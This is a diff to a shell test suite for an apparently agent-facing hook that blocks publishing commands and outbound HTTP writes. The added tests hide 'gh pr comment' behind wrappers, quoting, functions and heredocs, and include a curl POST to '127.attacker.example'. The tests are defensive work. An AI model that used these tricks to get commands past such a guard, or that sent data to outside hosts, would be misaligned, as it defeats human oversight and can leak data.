@@ -219,4 +219,38 @@ assert_eq "$OUT" "" "prose naming sudo and ssh asks nothing"
 run_hook_within 5 "$S" "$(jsonin "$(printf 'curl -d x localhost\n%.0s' {1..1000})"$'\n''gh pr comment 1 -b x')"
 assert_rc 2 "a publish after 1,000 curl lines is refused in half the hook budget"
 
+# A redirect before the command word is not the command (#109).
+run_hook "$S" "$(jsonin '> out gh pr create --fill')"
+assert_rc 2 "a ready PR behind a separate redirect blocked"
+
+# A function body, a case arm or a coproc runs its command, as does a command behind more wrappers (#110).
+run_hook "$S" "$(jsonin 'f() { gh pr comment 1 -b x; }; f')"
+assert_rc 2 "a publish in a function body blocked"
+run_hook "$S" "$(jsonin 'case x in *) gh pr comment 1 -b x;; esac')"
+assert_rc 2 "a publish in a case arm blocked"
+run_hook "$S" "$(jsonin 'timeout 5 bash -c "gh pr comment 1 -b x"')"
+assert_rc 2 "a publish in a shell behind timeout blocked"
+pipe_asks 'echo x | timeout 5 bash' "a pipe into a shell behind timeout asks"
+run_hook "$S" "$(jsonin 'timeout 5 make')"
+assert_eq "$OUT" "" "timeout 5 make asks nothing"
+
+# A wrapper's long option can take the next word as its value (#116).
+run_hook "$S" "$(jsonin 'sudo --user root bash -c "gh pr comment 1 -b x"')"
+assert_rc 2 "a publish in a shell behind sudo --user blocked"
+
+# A quoted or escaped command word is read as itself (#111).
+run_hook "$S" "$(jsonin '"bash" -c "gh pr comment 1 -b x"')"
+assert_rc 2 "a publish in a quoted shell's payload blocked"
+run_hook "$S" "$(jsonin $'ssh host \'bash -s\' <<EOF\ngh pr comment 1 -b x\nEOF')"
+assert_rc 2 "a publish in a heredoc fed to a quoted shell on another host blocked"
+run_hook "$S" "$(jsonin '"echo" hi')"
+assert_eq "$OUT" "" "a quoted echo asks nothing"
+
+# Only a dotted 127 address is loopback (#128).
+run_hook "$S" "$(jsonin 'curl -d x http://127.attacker.example/')"
+assert_rc 2 "an HTTP write to a public name that starts with 127. blocked"
+run_hook "$S" "$(jsonin 'curl -d x http://127.0.0.1:8080/x')"
+assert_rc 0 "an HTTP write to a loopback address allowed"
+assert_eq "$OUT" "" "an HTTP write to a loopback address asks nothing"
+
 finish "guard-publish"
